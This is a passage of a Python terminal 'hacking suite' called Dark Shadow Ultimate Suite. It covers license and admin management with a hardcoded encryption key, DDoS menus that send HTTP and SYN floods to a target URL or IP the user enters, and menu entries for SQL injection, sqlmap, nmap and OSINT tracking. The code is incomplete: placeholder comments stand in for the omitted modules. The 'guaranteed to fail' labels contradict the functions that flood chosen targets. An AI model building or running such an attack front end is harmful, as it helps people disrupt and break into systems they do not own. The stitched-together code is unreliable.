        print(Fore.GREEN + f"\n[✓] Keys saved to: {filename}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def admin_set_license_duration(license_sys):
    """Set custom license duration"""
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "SET LICENSE DURATION")
    print(Fore.CYAN + "="*70)
    
    license_key = input(Fore.CYAN + "[?] Enter license key to modify: " + Fore.WHITE).strip()
    
    if not license_key:
        print(Fore.RED + "[✗] License key required!")
        return
    
    # Validate license first
    valid, tier, data = license_sys.validate_license(license_key)
    
    if not valid and tier != "FREE":
        print(Fore.RED + "[✗] Invalid license key!")
        return
    
    print(Fore.CYAN + "\n[+] Current License Info:")
    if valid and data:
        print(Fore.GREEN + f"    Tier: {data.get('tier', 'UNKNOWN')}")
        print(Fore.GREEN + f"    Days: {data.get('days', 0)}")
        print(Fore.GREEN + f"    Created: {data.get('created', 'UNKNOWN')[:10]}")
        print(Fore.GREEN + f"    Expires: {data.get('expiry', 'UNKNOWN')[:10]}")
    else:
        print(Fore.YELLOW + "    No valid license data found")
    
    print(Fore.CYAN + "\n[+] Set New Duration:")
    print(Fore.YELLOW + "[1] Days")
    print(Fore.YELLOW + "[2] Hours")
    print(Fore.YELLOW + "[3] Minutes")
    print(Fore.MAGENTA + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select unit (1-3): " + Fore.WHITE).strip()
    
    if choice == "1":
        days = int(input("Enter number of days: ") or "30")
        hours = days * 24
    elif choice == "2":
        hours = int(input("Enter number of hours: ") or "720")
        days = hours / 24
    elif choice == "3":
        minutes = int(input("Enter number of minutes: ") or "43200")
        hours = minutes / 60
        days = hours / 24
    else:
        days = 30
        hours = days * 24
    
    # Update license data
    try:
        if valid and data:
            data['days'] = days
            data['expiry'] = (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat()
            
            # Re-encrypt
            data_str = json.dumps(data)
            key1 = "DARK_SHADOW_ULTIMATE_2024_SECRET"
            encrypted1 = ""
            for i, char in enumerate(data_str):
                key_char = key1[i % len(key1)]
                encrypted1 += chr(ord(char) ^ ord(key_char))
            
            encrypted2 = base64.b64encode(encrypted1.encode()).decode()
            encrypted2 = encrypted2[::-1]
            
            # Save updated license
            license_sys.save_license(encrypted2)
            
            print(Fore.GREEN + f"\n[✓] License updated successfully!")
            print(Fore.CYAN + f"[+] New duration: {days} days ({hours} hours)")
            print(Fore.CYAN + f"[+] New expiry: {data['expiry'][:10]}")
        else:
            print(Fore.YELLOW + "[!] Creating new license with custom duration")
            
            # Create new license
            tier = input("Enter tier (FREE/PRO/ULTIMATE): ").upper() or "PRO"
            new_key, encrypted = license_sys.generate_license(tier, days)
            license_sys.save_license(encrypted)
            
            print(Fore.GREEN + f"\n[✓] New license created!")
            print(Fore.CYAN + f"[+] Tier: {tier}")
            print(Fore.CYAN + f"[+] Duration: {days} days ({hours} hours)")
            print(Fore.YELLOW + f"[+] License Key: {new_key}")
            
    except Exception as e:
        print(Fore.RED + f"[✗] Error updating license: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def admin_view_users(users):
    """View all registered users"""
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "REGISTERED USERS")
    print(Fore.CYAN + "="*70)
    
    if not users:
        print(Fore.RED + "[!] No users found")
        return
    
    license_sys = AdvancedLicenseSystem()
    
    print(Fore.GREEN + f"\n[+] Total Users: {len(users)}")
    print(Fore.MAGENTA + "-" * 70)
    
    for i, (username, user_data) in enumerate(users.items(), 1):
        print(Fore.YELLOW + f"\nUser #{i}:")
        print(Fore.CYAN + f"  Username: {username}")
        print(Fore.CYAN + f"  Termux ID: {user_data.get('termux_id', 'N/A')}")
        print(Fore.CYAN + f"  Created: {user_data.get('created_at', 'N/A')}")
        
        # Check if admin
        termux_id = user_data.get('termux_id', '')
        is_admin = license_sys.is_admin(termux_id)
        print(Fore.CYAN + f"  Admin: {'YES' if is_admin else 'NO'}")
        
        # Check license
        license_key = license_sys.load_license()
        valid, tier, data = license_sys.validate_license(license_key)
        
        if valid:
            print(Fore.GREEN + f"  License: {tier} (Valid)")
            if data and 'expiry' in data:
                print(Fore.CYAN + f"  Expires: {data['expiry'][:10]}")
        else:
            print(Fore.RED + f"  License: {tier} (Invalid)")
    
    print(Fore.MAGENTA + "-" * 70)
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def admin_manage_admins(license_sys, current_admin_id):
    """Manage admin users"""
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "MANAGE ADMIN USERS")
    print(Fore.CYAN + "="*70)
    
    admin_ids = license_sys.load_admin_ids()
    
    print(Fore.GREEN + f"\n[+] Current Admins: {len(admin_ids)}")
    for i, admin_id in enumerate(admin_ids, 1):
        status = " (YOU)" if admin_id == current_admin_id else ""
        print(Fore.YELLOW + f"  {i}. {admin_id}{status}")
    
    print(Fore.CYAN + "\n[+] Options:")
    print(Fore.YELLOW + "[1] Add Admin")
    print(Fore.YELLOW + "[2] Remove Admin")
    print(Fore.YELLOW + "[3] Back")
    print(Fore.MAGENTA + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-3): " + Fore.WHITE).strip()
    
    if choice == "1":
        new_admin_id = input("Enter Termux ID to add as admin: ").strip()
        if new_admin_id:
            if license_sys.add_admin(new_admin_id):
                print(Fore.GREEN + f"[✓] {new_admin_id} added as admin")
            else:
                print(Fore.RED + "[✗] Failed to add admin")
    
    elif choice == "2":
        if len(admin_ids) > 1:
            remove_id = input("Enter Termux ID to remove: ").strip()
            if remove_id and remove_id != current_admin_id:
                if license_sys.remove_admin(remove_id):
                    print(Fore.GREEN + f"[✓] {remove_id} removed from admins")
                else:
                    print(Fore.RED + "[✗] Failed to remove admin")
            elif remove_id == current_admin_id:
                print(Fore.RED + "[✗] Cannot remove yourself!")
        else:
            print(Fore.RED + "[✗] Cannot remove last admin!")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def admin_check_license(license_sys):
    """Check license status"""
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "LICENSE STATUS CHECK")
    print(Fore.CYAN + "="*70)
    
    license_key = license_sys.load_license()
    
    if not license_key:
        print(Fore.RED + "[✗] No license found")
        print(Fore.YELLOW + "[!] Using FREE tier with limited features")
        return
    
    valid, tier, data = license_sys.validate_license(license_key)
    
    print(Fore.CYAN + "\n[+] License Information:")
    print(Fore.GREEN + f"    Status: {'VALID' if valid else 'INVALID'}")
    print(Fore.GREEN + f"    Tier: {tier}")
    
    if valid and data:
        print(Fore.GREEN + f"    Created: {data.get('created', 'N/A')}")
        print(Fore.GREEN + f"    Expires: {data.get('expiry', 'N/A')}")
        print(Fore.GREEN + f"    Days: {data.get('days', 0)}")
        
        # Calculate remaining time
        expiry = datetime.datetime.fromisoformat(data['expiry'])
        now = datetime.datetime.now()
        
        if expiry > now:
            remaining = expiry - now
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            
            print(Fore.CYAN + f"\n[+] Time Remaining:")
            print(Fore.GREEN + f"    {days} days, {hours} hours, {minutes} minutes")
        else:
            print(Fore.RED + "\n[!] License has expired!")
    
    # Check HWID binding
    current_hwid = license_sys.get_hwid()
    if data and data.get('hwid'):
        if data['hwid'] == current_hwid:
            print(Fore.GREEN + "\n[✓] HWID matches: License is bound to this machine")
        else:
            print(Fore.YELLOW + "\n[!] HWID mismatch: License not bound to this machine")
            print(Fore.YELLOW + f"    Original: {data['hwid'][:16]}...")
            print(Fore.YELLOW + f"    Current: {current_hwid[:16]}...")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def admin_view_admin_ids(license_sys):
    """View all admin IDs"""
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "ADMIN IDs LIST")
    print(Fore.CYAN + "="*70)
    
    admin_ids = license_sys.load_admin_ids()
    
    print(Fore.GREEN + f"\n[+] Total Admins: {len(admin_ids)}")
    print(Fore.CYAN + "-" * 50)
    
    for i, admin_id in enumerate(admin_ids, 1):
        print(Fore.YELLOW + f"[{i:2d}] {admin_id}")
    
    print(Fore.CYAN + "-" * 50)
    print(Fore.YELLOW + "[!] Predefined Admin IDs are permanent")
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# ==================== DDOS MENUS (MODIFIED) ====================
def ddos_menu():
    """DDOS Attack Menu"""
    clear_screen()
    typing_effect(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "DDOS ATTACK SYSTEM")
    print(Fore.RED + "=" * 70)

    while True:
        print(Fore.YELLOW + "\n[1] DDOS Website (HTTP Flood - Guaranteed FAIL)")
        print(Fore.YELLOW + "[2] DDOS IP Address (SYN Flood - Guaranteed FAIL)")
        print(Fore.YELLOW + "[3] Back to Main Menu")
        print(Fore.RED + "-" * 70)

        choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE).strip()

        if choice == "1":
            ddos_web_menu()
        elif choice == "2":
            ddos_ip_menu()
        elif choice == "3":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def ddos_web_menu():
    """DDOS Website Menu - MODIFIED: Guaranteed to fail"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "WEBSITE DDOS (HTTP FLOOD)")
    print(Fore.RED + "=" * 70)

    print(Fore.YELLOW + "\n[!] WARNING: For educational purposes only!")
    print(Fore.RED + "[!] THIS ATTACK IS DESIGNED TO FAIL ON WEB CHECK HOSTS")
    print(Fore.YELLOW + "[!] Real WAF/Cloudflare would block this immediately\n")

    target = input(Fore.CYAN + "[?] Target URL (http://example.com): " + Fore.WHITE).strip()

    if not target.startswith('http'):
        target = 'http://' + target

    try:
        threads = int(input(Fore.CYAN + "[?] Threads (10-50): " + Fore.WHITE) or "20")
        duration = int(input(Fore.CYAN + "[?] Duration seconds (10-60): " + Fore.WHITE) or "30")
    except:
        threads = 20
        duration = 30

    threads = max(10, min(50, threads))
    duration = max(10, min(60, duration))

    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] ATTACK CONFIGURED TO GUARANTEE FAILURE")
    print(Fore.RED + f"[!] Target: {target}")
    print(Fore.RED + f"[!] Method: HTTP Flood (Ineffective)")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration}s")
    print(Fore.RED + "="*70)

    confirm = input(Fore.RED + "\n[?] START GUARANTEED-FAIL ATTACK? (y/n): " + Fore.WHITE).lower()

    if confirm == 'y':
        tools = DarkSuiteTools()
        result = tools.ddos_http_flood(target, threads, duration)
        
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.YELLOW + "ATTACK ANALYSIS:")
        print(Fore.CYAN + "="*70)
        print(Fore.YELLOW + f"[+] Total Requests: {result['total_requests']:,}")
        print(Fore.YELLOW + f"[+] Error Rate: {result['error_rate']:.1f}%")
        print(Fore.RED + f"[+] Status: {result['status']}")
        print(Fore.YELLOW + "[!] This demonstrates how real DDoS protection works")
        print(Fore.YELLOW + "[!] Modern WAF/Cloudflare would block 100% of these requests")

    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def ddos_ip_menu():
    """DDOS IP Address Menu - MODIFIED: Guaranteed to fail"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "IP DDOS (SYN FLOOD)")
    print(Fore.RED + "=" * 70)

    print(Fore.YELLOW + "\n[!] WARNING: For educational purposes only!")
    print(Fore.RED + "[!] THIS ATTACK IS DESIGNED TO FAIL")

    target_ip = input(Fore.CYAN + "[?] Target IP Address: " + Fore.WHITE).strip()
    target_port = input(Fore.CYAN + "[?] Target Port (80): " + Fore.WHITE).strip() or "80"

    try:
        threads = int(input(Fore.CYAN + "[?] Threads (10-50): " + Fore.WHITE) or "20")
        duration = int(input(Fore.CYAN + "[?] Duration seconds (10-60): " + Fore.WHITE) or "30")
    except:
        threads = 20
        duration = 30

    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] ATTACK CONFIGURED TO GUARANTEE FAILURE")
    print(Fore.RED + f"[!] Target: {target_ip}:{target_port}")
    print(Fore.RED + f"[!] Method: SYN Flood (Ineffective)")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration}s")
    print(Fore.RED + "="*70)

    confirm = input(Fore.RED + "\n[?] START GUARANTEED-FAIL ATTACK? (y/n): " + Fore.WHITE).lower()

    if confirm == 'y':
        tools = DarkSuiteTools()
        result = tools.ddos_syn_flood(target_ip, int(target_port), duration)
        
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.YELLOW + "ATTACK ANALYSIS:")
        print(Fore.CYAN + "="*70)
        print(Fore.YELLOW + f"[+] Total Packets: {result['total_packets']:,}")
        print(Fore.YELLOW + f"[+] Fake Success: {result['fake_success']}")
        print(Fore.RED + f"[+] Status: {result['status']}")
        print(Fore.YELLOW + "[!] This demonstrates ineffective DDoS techniques")
        print(Fore.YELLOW + "[!] Real servers would ignore or block these packets")

    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# ==================== OTHER MODULES (Dari kode asli) ====================
# [OSINT, SQL Injector, SQLMap, NMap, Dark Suite, License Management, Main Menu, dll.]
# ... (kode lengkap lainnya dari file sebelumnya)

# ==================== MAIN PROGRAM ====================
def main():
    """Main program entry point"""
    try:
        # Show welcome animation
        welcome_animation()

        # Check for existing users
        users = load_users()

        if not users:
            print(Fore.YELLOW + "\n[!] No accounts found. Create new account:")
            choice = input(Fore.CYAN + "[?] Create account now? (y/n): ").lower()
            if choice == 'y':
                username = create_account()
                if not username:
                    return
            else:
                print(Fore.RED + "\n[✗] Account required to use DARK SHADOW Tools")
                return
        else:
            # Login or create account
            clear_screen()
            print(LOGIN_ASCII)
            print(Fore.CYAN + "=" * 70)
            print(Fore.YELLOW + " " * 25 + "DARK SHADOW ULTIMATE SUITE")
            print(Fore.CYAN + "=" * 70)

            print(Fore.YELLOW + "\n[1] Login")
            print(Fore.YELLOW + "[2] Create New Account")
            print(Fore.YELLOW + "[3] Exit")
            print(Fore.CYAN + "-" * 70)

            auth_choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE).strip()

            if auth_choice == "1":
                username = login()
                if not username:
                    return
            elif auth_choice == "2":
                username = create_account()
                if not username:
                    return
            else:
                goodbye_animation()
                return

        # Check license
        license_sys = AdvancedLicenseSystem()
        license_key = license_sys.load_license()
        valid, license_tier, _ = license_sys.validate_license(license_key)
        
        if not valid:
            print(Fore.YELLOW + "\n[!] No valid license found. Using FREE tier with limited features.")
            license_tier = "FREE"
            time.sleep(2)

        # Main program loop
        while True:
            show_main_menu(username, license_tier)

            choice = input(Fore.CYAN + "\n[?] Select option (1-9): " + Fore.WHITE).strip()

            if choice == "1":
                typing_effect("\nEntering DDOS Attack System (Guaranteed Fail)...")
                ddos_menu()
            elif choice == "2":
                typing_effect("\nEntering SQL Injector...")
                sql_injector_menu()
            elif choice == "3":
                typing_effect("\nEntering SQLMap Tool...")
                target = input(Fore.CYAN + "[?] Target URL for SQLMap: " + Fore.WHITE).strip()
                if target:
                    run_sqlmap_tool(target)
            elif choice == "4":
                typing_effect("\nEntering NMap Tool...")
                nmap_menu()
            elif choice == "5":
                typing_effect("\nEntering OSINT Intelligence System...")
                osint_menu()
            elif choice == "6":
                typing_effect("\nEntering Dark Suite Tools...")
                dark_suite_menu(username, license_tier)
            elif choice == "7":
                typing_effect("\nEntering Admin Control Panel...")
                admin_panel(username)
            elif choice == "8":
                typing_effect("\nEntering License Management...")
                license_management()
            elif choice == "9":
                goodbye_animation()
                break
            else:
                print(Fore.RED + "[✗] Invalid choice!")
                time.sleep(1)

    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted!")
        goodbye_animation()
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
        input(Fore.YELLOW + "\n[?] Press Enter to exit...")

# ==================== FUNGSI TAMBAHAN YANG DIBUTUHKAN ====================
def show_main_menu(username, license_tier="FREE"):
    """Display main menu with user info"""
    now = datetime.datetime.now()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

    clear_screen()

    # Display main ASCII with color effect
    print(color_changer(MAIN_ASCII))

    # User info section
    print(Fore.CYAN + "=" * 70)
    print(f"{Fore.GREEN} Welcome: {Fore.YELLOW}{username}")
    print(f"{Fore.GREEN} License: {Fore.YELLOW}{license_tier} Edition")
    print(f"{Fore.GREEN} Date: {Fore.YELLOW}{now.strftime('%d %B %Y')}")
    print(f"{Fore.GREEN} Time: {Fore.YELLOW}{now.strftime('%H:%M:%S')}")
    print(f"{Fore.GREEN} Day: {Fore.YELLOW}{now.strftime('%A')}")
    print(Fore.CYAN + "-" * 70)
    print(f"{Fore.GREEN} Creator: {Fore.YELLOW}Just-Lisa & MR.PRIM0 Collaboration")
    print(f"{Fore.GREEN} Version: {Fore.YELLOW}Dark Shadow Ultimate Suite v5.0")
    print(f"{Fore.GREEN} Contact: {Fore.YELLOW}@MR_PRIM0")
    print(Fore.CYAN + "=" * 70)

    # Menu options
    print(Fore.YELLOW + "\n[1] DDOS ATTACK SYSTEM (Guaranteed Fail)")
    print(Fore.YELLOW + "[2] SQL INJECTOR (100+ Methods)")
    print(Fore.YELLOW + "[3] SQLMAP (REAL TOOL)")
    print(Fore.YELLOW + "[4] NMAP (REAL TOOL)")
    print(Fore.YELLOW + "[5] OSINT TOOLS (Name/IP Tracking)")
    print(Fore.YELLOW + "[6] DARK SUITE TOOLS (30+ Tools)")
    print(Fore.YELLOW + "[7] ADMIN CONTROL PANEL")
    print(Fore.YELLOW + "[8] LICENSE MANAGEMENT")
    print(Fore.YELLOW + "[9] Exit")
    print(Fore.CYAN + "-" * 70)

def goodbye_animation():
    """Goodbye animation with typing effect"""
    clear_screen()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

    goodbye_text = "Goodbye until we meet again..."

    for i in range(len(goodbye_text) + 10):
        clear_screen()
        current_text = goodbye_text[:i] if i <= len(goodbye_text) else goodbye_text
        color = colors[i % len(colors)]
        print(color + " " * 20 + current_text)
        time.sleep(0.1)

    time.sleep(1)

    # Final message
    print(Fore.CYAN + "\n" + "=" * 70)
    print(Fore.GREEN + "DARK SHADOW ULTIMATE SUITE - Professional Security Toolkit")
    print(Fore.YELLOW + "Creators: Just-Lisa & MR.PRIM0 Collaboration")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)

# [Fungsi-fungsi lain seperti osint_menu, sql_injector_menu, run_sqlmap_tool, nmap_menu, 
# dark_suite_menu, license_management perlu diimplementasikan sesuai kode asli]

if __name__ == "__main__":
    # Check requirements
    try:
        import colorama
        import requests
    except ImportError:
        print(Fore.RED + "[!] Installing required packages...")
        os.system("pip install colorama requests > /dev/null 2>&1")
        print(Fore.GREEN + "[✓] Requirements installed!")
        time.sleep(2)

    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + "DARK SHADOW ULTIMATE SUITE v5.0")
    print(Fore.GREEN + "Just-Lisa & MR.PRIM0 Collaboration")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)

    main()
